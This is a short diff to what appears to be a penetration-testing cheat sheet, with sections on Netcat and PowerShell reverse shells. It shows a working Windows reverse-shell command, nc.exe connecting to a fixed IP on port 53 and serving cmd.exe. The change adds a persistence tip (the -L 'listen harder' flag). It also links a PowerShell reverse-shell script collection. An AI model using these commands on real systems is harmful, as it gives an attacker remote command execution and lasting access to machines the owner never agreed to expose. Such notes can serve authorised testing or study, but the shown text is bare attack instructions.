@@ -62,8 +62,9 @@ Add a user in windows with msfvenom:
 ### Netcat
 upload static binary nc.exe and invoke 
 
-
     nc.exe -nv 192.168.119.149 53 -e C:\WINDOWS\system32\cmd.exe 
+    
+Persistence: use -L for "listen harder"  
 
 ### Powershell 
 [Powershell reverse shell scripts](https://github.com/ivan-sincek/powershell-reverse-tcp)  
